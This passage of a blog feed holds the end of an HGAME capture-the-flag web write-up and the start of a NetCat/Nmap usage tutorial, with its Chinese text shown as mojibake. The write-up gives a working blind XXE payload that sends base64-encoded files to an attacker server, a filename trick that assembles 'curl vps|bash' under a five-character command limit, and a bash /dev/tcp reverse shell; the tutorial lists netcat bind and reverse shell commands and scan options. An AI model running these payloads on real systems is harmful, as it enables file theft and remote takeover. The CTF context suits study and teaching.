class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://yourvps/exp1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span><span class="tag">&lt;<span class="name">id</span>&gt;</span>moonback<span class="tag">&lt;/<span class="name">id</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>aasd<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">level</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">level</span>&gt;</span><span class="tag">&lt;<span class="name">time</span>&gt;</span>415441<span class="tag">&lt;/<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>vpsä¸Šï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;yourvps:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ç›‘å¬9001ç«¯å£å°±å¯ä»¥è¯»æ–‡ä»¶äº†ï¼Œè¯»å–<code>/etc/hosts</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1localhost</span><br><span class="line">::1localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0ip6-localnet</span><br><span class="line">ff00::0ip6-mcastprefix</span><br><span class="line">ff02::1ip6-allnodes</span><br><span class="line">ff02::2ip6-allrouters</span><br><span class="line">172.21.0.76hgame-private</span><br><span class="line">172.21.0.31f9f1b9b99e13</span><br></pre></td></tr></table></figure><p>å‘ç°<code>172.21.0.76</code>æ¯”è¾ƒç‰¹æ®Šï¼Œè¯•ç€è®¿é—®ï¼Œè¿™é‡Œæœ‰ä¸ªtips:</p><p>å½“ä½¿â½¤ libxml è¯»å–â½‚ä»¶å†…å®¹çš„æ—¶å€™ï¼Œâ½‚ä»¶ä¸èƒ½è¿‡â¼¤ï¼Œå¦‚æœå¤ªâ¼¤å°±ä¼šæŠ¥é”™â½†æ³•å¾—åˆ°â½‚ä»¶å†…å®¹ï¼Œå› æ­¤éœ€è¦ä½¿â½¤ phpè¿‡æ»¤å™¨çš„â¼€ä¸ªå‹ç¼©çš„â½…æ³•zlib.deflflate</p><p>æ‰€ä»¥vpsä¸Šæ„é€ ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;172.21.0.76&#x2F;?token&#x3D;12335565&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;yourvps:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å°±èƒ½å¾—åˆ°å‹ç¼©åçš„ä¸œè¥¿ï¼Œåªéœ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-decode/zlib.inflate/resource=a&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å°±èƒ½å¾—åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$token = @$_GET[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($token)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¯·å¸¦ä¸Šæ‚¨çš„é˜Ÿä¼tokenè®¿é—®! /?token=&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$api = <span class="string">&quot;http://checker/?token=&quot;</span>.$token;</span><br><span class="line">$t = file_get_contents($api);</span><br><span class="line"><span class="keyword">if</span>($t !== <span class="string">&quot;ok&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;é˜Ÿä¼tokené”™è¯¯&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$sandbox = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>. md5(<span class="string">&quot;hgame2020&quot;</span> . $token);;</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">$content = $_GET[<span class="string">&#x27;v&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($content)) &#123;</span><br><span class="line">    $cmd = substr($content,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    system($cmd);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>])) &#123;</span><br><span class="line">    system(<span class="string">&#x27;rm -rf ./*&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _</span></span><br><span class="line"><span class="comment">  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |</span></span><br><span class="line"><span class="comment"> | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |</span></span><br><span class="line"><span class="comment">  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |</span></span><br><span class="line"><span class="comment">  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|</span></span><br><span class="line"><span class="comment"> |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)</span></span><br><span class="line"><span class="comment">                                    |/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥æ˜¯é™åˆ¶5å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œï¼Œç”±äºæ²¡æœ‰è¯´flflagåœ¨å“ªï¼Œå› æ­¤éœ€è¦åå¼¹shellâ½…ä¾¿æ‰¾flagçš„ä½ç½®</p><p>åœ¨linuxä¸­ï¼Œâ¼€æ¡å‘½ä»¤å¯ä»¥é€šè¿‡ç¬¦å· \ åˆ†å‰²ä¸ºå¤šâ¾ä¸å½±å“æ‰§â¾ç»“æœã€‚å¦‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu:~<span class="comment"># cat test</span></span><br><span class="line">ec\</span><br><span class="line">ho \</span><br><span class="line">hello!</span><br><span class="line">ubuntu:~<span class="comment"># sh test</span></span><br><span class="line">hello!</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©â½¤è¿™ä¸ªç‰¹æ€§ï¼Œå°†è¶…â»“çš„å‘½ä»¤åˆ†å‰²ä¸ºå¤šæ®µæ¥æ‰§â¾ã€‚</p><p>ä¸ºäº†è®©æœåŠ¡å™¨è®°ä½æˆ‘ä»¬å…ˆå‰æ‰€è¾“â¼Šçš„å‘½ä»¤â½šæ®µï¼Œæˆ‘ä»¬å¯ä»¥åˆ©â½¤é‡å®šå‘ç¬¦ <code>&gt;</code> <code>&gt;&gt;</code> æ¥åœ¨å½“å‰â½¬å½•åˆ›å»ºâ½‚ä»¶ã€‚</p><p>â½‚ä»¶åå³ä¸ºæˆ‘ä»¬æ‰€éœ€çš„å‘½ä»¤â½šæ®µã€‚</p><p>ä¸ºäº†è®©åˆ›å»ºçš„â½‚ä»¶æŒ‰ç…§æˆ‘ä»¬æƒ³è¦çš„é¡ºåºæ’åˆ—ï¼Œå¯ä»¥ä½¿â½¤ <code>ls -t</code> ä½¿å¾—â½‚ä»¶æŒ‰ç…§åˆ›å»ºæ—¶é—´å…ˆåæ’åºã€‚</p><p>â½½ <code>ls -t&gt;a</code> è¶…â»“åº¦é™åˆ¶ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦â½¤ <code>ls&gt;_</code> æ¥æ„é€ å‡º <code>ls -t&gt;a</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;ls\\<span class="comment">#å†™ls\æ–‡ä»¶ï¼Œä¼šè½¬ä¹‰æ‰€ä»¥ç”¨ä¸¤ä¸ª</span></span><br><span class="line">ls&gt;_<span class="comment">#åˆ—ä¸¾æ–‡ä»¶ï¼Œå°†ls\å†™å…¥_æ–‡ä»¶</span></span><br><span class="line">&gt;\ \\<span class="comment">#å†™ç©ºæ ¼\æ–‡ä»¶</span></span><br><span class="line">&gt;-t\\<span class="comment">#å†™-t\æ–‡ä»¶&gt;ã€‹</span></span><br><span class="line">&gt;\&gt;y<span class="comment">#å†™&gt;yæ–‡ä»¶</span></span><br><span class="line">ls&gt;&gt;_<span class="comment">#å°†æ–‡ä»¶åè¿½åŠ åˆ°_æ–‡ä»¶å†…</span></span><br></pre></td></tr></table></figure><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/20180916180041-5f019c22-b997-1.png" style="zoom:80%;"><p>åå¼¹shellç›´æ¥ç”¨bashåå¼¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/0.0.0.0/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>è¿™æ®µä¸å¤ªå®¹æ˜“æ„é€ ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl vps|bash</span><br><span class="line"></span><br><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;0\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line">sh _</span><br><span class="line">sh y</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥å¼¹shellæ‹¿flagäº†</p><p>ä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬ï¼ŒæœåŠ¡å™¨ä¸Šæ”¾ä¸ªphpï¼Œæ¥æ”¶postè¿‡æ¥çš„dtdå¹¶å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œæ³¨æ„ï¼š</p><ol><li>å‘½ä»¤è¦ç”¨åŸç”Ÿå­—ç¬¦ä¸²</li><li>æ³¨æ„ç”Ÿæˆçš„æ–‡ä»¶æœ‰é‡å¤çš„æ²¡(æˆ‘çš„æœåŠ¡å™¨ipä¼šç”Ÿæˆä¸¤ä¸ª7.æ–‡ä»¶ï¼Œç„¶åä¸€ç›´å¼¹ä¸äº†shell,æ²¡åŠæ³•åªèƒ½ç”¨åŸŸåäº†)</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> HAGAME </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NetCat,Nmap,WireShackå·¥å…·ä½¿ç”¨</title>
      <link href="2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/"/>
      <url>2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†NetCat,Nmap,WireShackä¸‰ä¸ªå·¥å…·ä½¿ç”¨è¯¦æƒ…ï¼</p><a id="more"></a><h2 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h2><h3 id="å¸¸ç”¨å‚æ•°"><a href="#å¸¸ç”¨å‚æ•°" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-g&lt;ç½‘å…³&gt;ï¼šè®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šè®¾ç½®8ä¸ªï¼›</span><br><span class="line">-G&lt;æŒ‡å‘å™¨æ•°ç›®&gt;ï¼šè®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°ï¼›</span><br><span class="line">-hï¼šå¸®åŠ©ï¼›</span><br><span class="line">-i&lt;å»¶è¿Ÿç§’æ•°&gt;ï¼šè®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-lï¼šä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç›‘æ§ä¼ å…¥çš„èµ„æ–™ï¼›</span><br><span class="line">-nï¼šç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ï¼›</span><br><span class="line">-o&lt;è¾“å‡ºæ–‡ä»¶&gt;ï¼šæŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜ï¼›</span><br><span class="line">-p&lt;é€šä¿¡ç«¯å£&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-rï¼šæŒ‡å®šæºç«¯å£å’Œç›®çš„ç«¯å£éƒ½è¿›è¡Œéšæœºçš„é€‰æ‹©ï¼›</span><br><span class="line">-s&lt;æ¥æºä½å€&gt;ï¼šè®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ï¼›</span><br><span class="line">-uï¼šä½¿ç”¨UDPä¼ è¾“åè®®ï¼›</span><br><span class="line">-vï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›</span><br><span class="line">-w&lt;è¶…æ—¶ç§’æ•°&gt;ï¼šè®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´ï¼›</span><br><span class="line">-zï¼šä½¿ç”¨0è¾“å…¥&#x2F;è¾“å‡ºæ¨¡å¼ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨</span><br></pre></td></tr></table></figure><h3 id="è¿œç¨‹æ§åˆ¶"><a href="#è¿œç¨‹æ§åˆ¶" class="headerlink" title="è¿œç¨‹æ§åˆ¶"></a>è¿œç¨‹æ§åˆ¶</h3><h4 id="æ­£å‘"><a href="#æ­£å‘" class="headerlink" title="æ­£å‘"></a>æ­£å‘</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¢«æ§ç«¯ï¼šnc -lp 333 -c bash</span><br><span class="line">æ”»å‡»ç«¯ï¼šnc 1.1.1.1 333</span><br></pre></td></tr></table></figure><h4 id="åå‘"><a href="#åå‘" class="headerlink" title="åå‘"></a>åå‘</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¢«æ§ç«¯ï¼šnc 1.1.1.1 333 -c bash</span><br><span class="line">æ”»å‡»ç«¯ï¼šnc -lp 333</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šWindowsâ½¤æˆ·æŠŠbashæ”¹æˆcmd</p><h3 id="ä¼ è¾“æ–‡ä»¶"><a href="#ä¼ è¾“æ–‡ä»¶" class="headerlink" title="ä¼ è¾“æ–‡ä»¶"></a>ä¼ è¾“æ–‡ä»¶</h3><p>ä¹Ÿæœ‰ä¸¤ç§æ–¹å¼</p><p><strong>æ–¹å¼1ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ¥æ”¶ç«¯ï¼šnc -lp 333 &gt; 1.mp4</span><br><span class="line">å‘é€ç«¯ï¼šnc -nv 1.1.1.1 333 &lt; 1.mp4 â€“q 1</span><br></pre></td></tr></table></figure><p><strong>æ–¹å¼2ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ¥æ”¶ç«¯ï¼šnc -nv 1.1.1.1 333 &gt; a.mp4</span><br><span class="line">å‘é€ç«¯ï¼šnc -q 1 -lp 333 &lt; a.mp4</span><br></pre></td></tr></table></figure><p><strong>ä¼ è¾“ç›®å½•</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å‘é€ç«¯ï¼štar -cvf - music/ | nc -lp 333 â€“q 1</span><br><span class="line">æ¥æ”¶ç«¯ï¼šnc -nv 1.1.1.1 333 | tar -xvf -</span><br></pre></td></tr></table></figure><p>æ³¨æ„æœ‰ä¸ª<code>-</code></p><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-100</span><br></pre></td></tr></table></figure><p>n å‚æ•°ä½œç”¨æ˜¯è·Ÿ ip åœ°å€ï¼Œä¸åš dns åŸŸåè§£æ,v å‚æ•°æ˜¯æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ã€‚z å‚æ•°å°±æ˜¯æ‰«ææ¨¡å¼ï¼Œé»˜è®¤å°±æ˜¯ tcp å…¨é“¾æ¥æ‰«æã€‚</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="Nmap-å‚æ•°è¯¦è§£"><a href="#Nmap-å‚æ•°è¯¦è§£" class="headerlink" title="Nmap å‚æ•°è¯¦è§£"></a>Nmap å‚æ•°è¯¦è§£</h3><p>Nmapæ”¯æŒä¸»æœºå,ip,ç½‘æ®µçš„è¡¨ç¤ºæ–¹å¼</p><p>ä¾‹å¦‚:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-iL filename                    ä»æ–‡ä»¶ä¸­è¯»å–å¾…æ£€æµ‹çš„ç›®æ ‡,æ–‡ä»¶ä¸­çš„è¡¨ç¤ºæ–¹æ³•æ”¯æŒæœºå,ip,ç½‘æ®µ</span><br><span class="line">-iR hostnum                     éšæœºé€‰å–,è¿›è¡Œæ‰«æ.å¦‚æœ-iRæŒ‡å®šä¸º0,åˆ™æ˜¯æ— ä¼‘æ­¢çš„æ‰«æ</span><br><span class="line">--exclude host1[, host2]        ä»æ‰«æä»»åŠ¡ä¸­éœ€è¦æ’é™¤çš„ä¸»æœº           </span><br><span class="line">--exculdefile exclude_file      æ’é™¤æ–‡ä»¶ä¸­çš„IP,æ ¼å¼å’Œ-iLæŒ‡å®šæ‰«ææ–‡ä»¶çš„æ ¼å¼ç›¸åŒ</span><br></pre></td></tr></table></figure><p>ä¸»æœºå‘ç°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sL                     ä»…ä»…æ˜¯æ˜¾ç¤º,æ‰«æçš„IPæ•°ç›®,ä¸ä¼šè¿›è¡Œä»»ä½•æ‰«æ</span><br><span class="line">-sn                     pingæ‰«æ,å³ä¸»æœºå‘ç°</span><br><span class="line">-Pn                     ä¸æ£€æµ‹ä¸»æœºå­˜æ´»</span><br><span class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Pingå‘ç°</span><br><span class="line">-PE/PP/PM               ä½¿ç”¨ICMP <span class="built_in">echo</span>, timestamp and netmask è¯·æ±‚åŒ…å‘ç°ä¸»æœº</span><br><span class="line">-PO[prococol list]      ä½¿ç”¨IPåè®®åŒ…æ¢æµ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦å¼€å¯   </span><br><span class="line">-n/-R                   ä¸å¯¹IPè¿›è¡ŒåŸŸååå‘è§£æ/ä¸ºæ‰€æœ‰çš„IPéƒ½è¿›è¡ŒåŸŸåçš„åå“è§£æ</span><br></pre></td></tr></table></figure><p>æ‰«ææŠ€å·§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCPçª—å£æ‰«æ/TCP Maimonæ‰«æ</span><br><span class="line">-sU                             UDPæ‰«æ</span><br><span class="line">-sN/sF/sX                       TCP Nullï¼ŒFINï¼Œand Xmasæ‰«æ</span><br><span class="line">--scanflags                     è‡ªå®šä¹‰TCPåŒ…ä¸­çš„flags</span><br><span class="line">-sI zombie host[:probeport]     Idlescan</span><br><span class="line">-sY/sZ                          SCTP INIT/COOKIE-ECHO æ‰«æ</span><br><span class="line">-sO                             ä½¿ç”¨IP protocol æ‰«æç¡®å®šç›®æ ‡æœºæ”¯æŒçš„åè®®ç±»å‹</span><br><span class="line">-b â€œFTP relay hostâ€             ä½¿ç”¨FTP bounce scan</span><br></pre></td></tr></table></figure><p>æŒ‡å®šç«¯å£å’Œæ‰«æé¡ºåº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p                      ç‰¹å®šçš„ç«¯å£ -p80,443 æˆ–è€… -p1-65535</span><br><span class="line">-p U:PORT               æ‰«æudpçš„æŸä¸ªç«¯å£, -p U:53</span><br><span class="line">-F                      å¿«é€Ÿæ‰«ææ¨¡å¼,æ¯”é»˜è®¤çš„æ‰«æç«¯å£è¿˜å°‘</span><br><span class="line">-r                      ä¸éšæœºæ‰«æç«¯å£,é»˜è®¤æ˜¯éšæœºæ‰«æçš„</span><br><span class="line">--top-ports &quot;number&quot;    æ‰«æå¼€æ”¾æ¦‚ç‡æœ€é«˜çš„numberä¸ªç«¯å£,å‡ºç°çš„æ¦‚ç‡éœ€è¦å‚è€ƒnmap-servicesæ–‡ä»¶,ubuntuä¸­è¯¥æ–‡ä»¶ä½äº&#x2F;usr&#x2F;share&#x2F;nmap.nmapé»˜è®¤æ‰«å‰1000ä¸ª</span><br><span class="line">--port-ratio &quot;ratio&quot;    æ‰«ææŒ‡å®šé¢‘ç‡ä»¥ä¸Šçš„ç«¯å£</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç‰ˆæœ¬è¯†åˆ«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-sV                             å¼€æ”¾ç‰ˆæœ¬æ¢æµ‹,å¯ä»¥ç›´æ¥ä½¿ç”¨-AåŒæ—¶æ‰“å¼€æ“ä½œç³»ç»Ÿæ¢æµ‹å’Œç‰ˆæœ¬æ¢æµ‹</span><br><span class="line">--version-intensity &quot;level&quot;     è®¾ç½®ç‰ˆæœ¬æ‰«æå¼ºåº¦,å¼ºåº¦æ°´å¹³è¯´æ˜äº†åº”è¯¥ä½¿ç”¨å“ªäº›æ¢æµ‹æŠ¥æ–‡ã€‚æ•°å€¼è¶Šé«˜ï¼ŒæœåŠ¡è¶Šæœ‰å¯èƒ½è¢«æ­£ç¡®è¯†åˆ«ã€‚é»˜è®¤æ˜¯7</span><br><span class="line">--version-light                 æ‰“å¼€è½»é‡çº§æ¨¡å¼,ä¸º--version-intensity 2çš„åˆ«å</span><br><span class="line">--version-all                   å°è¯•æ‰€æœ‰æ¢æµ‹,ä¸º--version-intensity 9çš„åˆ«å</span><br><span class="line">--version-trace                 æ˜¾ç¤ºå‡ºè¯¦ç»†çš„ç‰ˆæœ¬ä¾¦æµ‹è¿‡ç¨‹ä¿¡æ¯</span><br></pre></td></tr></table></figure><p>è„šæœ¬æ‰«æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sC                             æ ¹æ®ç«¯å£è¯†åˆ«çš„æœåŠ¡,è°ƒç”¨é»˜è®¤è„šæœ¬</span><br><span class="line">--script&#x3D;â€Lua scriptsâ€          è°ƒç”¨çš„è„šæœ¬å</span><br><span class="line">--script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2]     è°ƒç”¨çš„è„šæœ¬ä¼ é€’çš„å‚æ•°</span><br><span class="line">--script-args-file&#x3D;filename     ä½¿ç”¨æ–‡æœ¬ä¼ é€’å‚æ•°</span><br><span class="line">--script-trace                  æ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶åˆ°çš„æ•°æ®</span><br><span class="line">--script-updatedb               æ›´æ–°è„šæœ¬çš„æ•°æ®åº“</span><br><span class="line">--script-help&#x3D;â€Lua scriptâ€      æ˜¾ç¤ºæŒ‡å®šè„šæœ¬çš„å¸®åŠ©</span><br></pre></td></tr></table></figure><p>OSè¯†åˆ«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-O              å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹,-Aæ¥åŒæ—¶å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œç‰ˆæœ¬æ£€æµ‹</span><br><span class="line">--osscan-limit  é’ˆå¯¹æŒ‡å®šçš„ç›®æ 